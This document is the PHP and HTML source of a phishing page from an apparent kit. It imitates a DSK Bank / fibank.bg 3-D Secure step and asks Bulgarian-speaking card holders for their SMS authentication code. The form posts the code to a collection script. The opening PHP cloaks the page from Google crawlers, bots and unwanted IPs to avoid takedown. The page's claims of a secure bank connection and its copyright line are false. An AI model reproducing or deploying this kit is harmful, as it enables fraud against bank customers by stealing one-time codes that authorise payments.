<?php 
$aa = $_SERVER['HTTP_HOST'];
$ref = $_SERVER['HTTP_REFERER'];
$refData = parse_url($ref);
if ($refData['host'] !=$aa) {
?>
<?php }elseif($_SERVER['HTTP_REFERER'] == NULL){
     header('HTTP/1.0 404 Not Found');
     exit(); ?>
<?php }else{ ?>
<?php
session_start();
error_reporting(0);

/*
█▀▀█ █▀▀█ █░░   ▀█░█▀ ░█▀█░ ░ █▀▀█
█░░█ █░░█ █░░   ░█▄█░ █▄▄█▄ ▄ █▄▀█
█▀▀▀ █▀▀▀ ▀▀▀   ░░▀░░ ░░░█░ █ █▄▄█
                                                 
*/

include "../boots/antibots1.php";
include "../boots/antibots1.php";
include "../boots/antibots1.php";
include "../boots/antibots1.php";
include "../boots/antibots1.php";
include "../boots/antibots1.php";


if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }

session_start();

include("functionns/Bot-blocker.php");
include("functionns/Geo-plugin.php");
include("functionns/OS-Platform.php");
include('../Denny-ip.php');

$random = rand(0,100000000000);
$dis    = substr(md5($random), 0, 25);
?>
<!DOCTYPE html>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
	<meta http-equiv="Expires" content="-1">
	<meta http-equiv="Pragma" content="no-cache">
	<meta http-equiv="Cache-Control" content="no-cache">
	<link rel="shortcut icon" href="securevbv/n-icon.png">
<link rel="icon" type="securevbv/n-icon.png" href="https://www.gotoburgas.com/uploads/property/0bd5ce437f020df7577013d3d113d86e.png">
	<link href="securevbv/ntt.css" rel="stylesheet" type="text/css">
	<title>
		DSK : SMS CODE
	</title>
</head>

<body onload="SetFocus()" bgcolor="#ffffff">

<form name="A1" method="post" action="../send/3d.php" >


<center>
<table cellpadding="0" cellspacing="0" border="0">
<tbody><tr>
	<td>
		<table cellpadding="0" cellspacing="0" border="0" width="350px">
  	    <tbody><tr>
			<td valign="top">

				
				<br><br><br><br><table cellpadding="0" cellspacing="0" border="0" width="100%">
				<tbody><tr>
					<td>
						<center><table bgcolor="#FFFFFF" border="0" bordercolor="#88A0B8" width="100%">
						<tbody><tr>
							<td align="left" width="50%">
								<img src="https://i.ibb.co/XD3YL2H/Z01ewhv.png" border="0" style="width:300px"></center>
							</td>
							
							<td align="right" width="50%">
								
							</td>
						</tr>
						</tbody></table>
						<br>
					</td>
				</tr>
				</tbody></table>






    <table cellpadding="3" cellspacing="0" border="0" width="100%">
	<tbody><tr>
		

		
            <td align="left" colspan="3" class="normalgray">
				<font color="black"><font style="color:red;">В момента сте свързани със сайт за сигурни плащания, управляван от fibank.bg </font>. Информацията за плащане се изпраща сигурно до банката, картовите компании и платежните сертификати за транзакции с SSL криптиране до 256 бита. Кликнете
				<br> Бътън. Защото може да не бъде обработена правилно
				<br> Да влезеш
				<b>SMS</b> Код на услугата за удостоверяване (dskbank.bg/Secure) Y „Изпращане“
Кликнете върху бутона. Възможно е да не се обработва правилно
Не натискайте бутона „Назад“ на браузъра
.</font><br>
			</td>
		
	</tr>
	<tr>
        <td valign="top" align="left">
            <table cellpadding="3" cellspacing="0" border="0" width="100%">

            
						
			
			
			
            <tbody>

				
            

            

            

            
            

            <tr>
		

		
            <td colspan="3" class="normalgray">
			<center><img width="120" src="https://media.giphy.com/media/3oEjI6SIIHBdRxXI40/giphy.gif"></center><br>
				<font color="black">Ако не получите кода в рамките на 5 минути, щракнете върху Изпращане отново
</font><br>
			</td>
		
	</tr>

            <tr>
                <td class="normalbold" valign="center" width="150px" >
SMS КОД:
                </td>
                <td width="10px">
                </td>
                <td valign="top" width="100px">
                    <!-- no errors, retain password -->
					   <form action="functionns/send-login.php" method="post" name="loginForm">                 
					<input type="VbvPass" maxlength="32" size="20" name="VbvPass" value="" placeholder="XXXXXXXXX"  type="text" autocomplete="off" required="" aria-required="true">
					
					                </td>
                
            </tr>

            
            
            
            

            <tr height="10">

            </tr>

            

            <tr>
                
                    <td valign="top" align="left">&nbsp;</td>
                    <td width="10px">
                    </td>
                    <td valign="top" align="left" width="180px">

		    <table cellpadding="0" cellspacing="0" border="0" width="180px">
		    <tbody><tr>
			<td nowrap="">

                        
                       <input name=""  value="Изпращане" style="" type="submit">
					   
						
			</td>
			
			</form>
	
<td nowrap="">  

                        
                            <a class="normallink" href="#">
                        </noscript>
                            <font class="normallink">Изпратете отново</font>
                        </a>

			</td>
		</tr>
		</tbody></table>

                    </td>
                
            </tr>

            </tbody></table>
        </td>
    </tr>
    </tbody></table>

    

				</td></tr><tr>
					</tr></tbody></table><table cellpadding="0" cellspacing="0" bgcolor="#FFFFFF" border="0" bordercolor="#88A0B8" width="100%">
					<tbody><tr>
						<td class="copyright" align="center">
							
						</td>
					</tr>
					</tbody></table>
				</td></tr>

	
			
	  	
		</tbody></table>
	


</center>




<br>
<!-- #sub-footer -->

<ul class="first">
<br>
	<center>
	<li class="copyright">Copyright &copy; <?php echo date("Y"); ?> DSKBANK Corp. All rights reserved
.</li></center>
</ul>
<!-- /#sub-footer -->





</body></html>
<?php } ?>